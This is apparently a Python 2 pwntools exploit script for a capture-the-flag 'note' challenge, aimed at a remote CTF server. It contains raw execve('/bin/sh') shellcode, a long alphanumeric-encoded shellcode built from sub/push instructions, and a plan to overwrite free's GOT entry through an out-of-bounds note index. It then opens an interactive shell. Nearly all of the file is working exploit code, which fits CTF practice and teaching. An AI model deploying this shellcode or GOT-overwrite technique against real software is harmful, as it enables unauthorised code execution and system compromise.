#!/bin/env python2
from pwn import *

#p = remote('linux8.csie.ntu.edu.tw', 7122)
p = remote('csie.ctf.tw', 10139)
#p = process('./a.out')

def recv_menu():
    print p.recvuntil('Your choice :')

def add_note(index, name):
    recv_menu()
    p.sendline('1')
    print '1'
    print p.recvuntil('Index :')
    p.sendline(str(index))
    print str(index)
    print p.recvuntil('Name :')
    if len(name) == 80:
        p.send(name)
    else:
        p.sendline(name)
    print name

def show_note(index):
    recv_menu()
    p.sendline('2')
    print '2'
    print p.recvuntil('Index :')
    p.sendline(str(index))
    print str(index)

def del_note(index):
    recv_menu()
    p.sendline('3')
    print '3'
    print p.recvuntil('Index :')
    p.sendline(str(index))
    print str(index)

got_free = 0x0804a014
bss_note = 0x0804a060
shell32 = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

assembly =  'pop eax;' \
            'pop eax;' \
            'sub eax, 0x55555540;' \
            'sub eax, 0x55555540;' \
            'sub eax, 0x55555530;' \
            'push eax;' \
            'pop esp;' \
            'and eax, 0x3a313035;' \
            'and eax, 0x454e4f4a;' \
            'sub eax,0x346d6d25;' \
            'sub eax,0x256d6d25;' \
            'sub eax,0x2557442d;' \
            'push eax;' \
            'sub eax,0x59316659;' \
            'sub eax,0x59667766;' \
            'sub eax,0x7a537a79;' \
            'push eax;' \
            'sub eax,0x25696969;' \
            'sub eax,0x25786b5a;' \
            'sub eax,0x25774625;' \
            'push eax;' \
            'sub eax,0x366e5858;' \
            'sub eax,0x25773939;' \
            'sub eax,0x25747470;' \
            'push eax;' \
            'sub eax,0x25257725;' \
            'sub eax,0x71717171;' \
            'sub eax,0x5869506a;' \
            'push eax;' \
            'sub eax,0x63636363;' \
            'sub eax,0x44307744;' \
            'sub eax,0x7a434957;' \
            'push eax;' \
            'sub eax,0x63363663;' \
            'sub eax,0x6d543057;' \
            'push eax;' \
            'sub eax,0x54545454;' \
            'sub eax,0x304e4e25;' \
            'sub eax,0x32346f25;' \
            'sub eax,0x302d6137;' \
            'push eax;' \
            'sub eax,0x78474778;' \
            'sub eax,0x78727272;' \
            'sub eax,0x774f4661;' \
            'push eax;' \
            'sub eax,0x41704170;' \
            'sub eax,0x2d772d4e;' \
            'sub eax,0x32483242;' \
            'push eax;'
payload = asm(assembly)
print payload, len(payload)

#add_note((got_free-bss_note)/4, payload)

p.interactive()
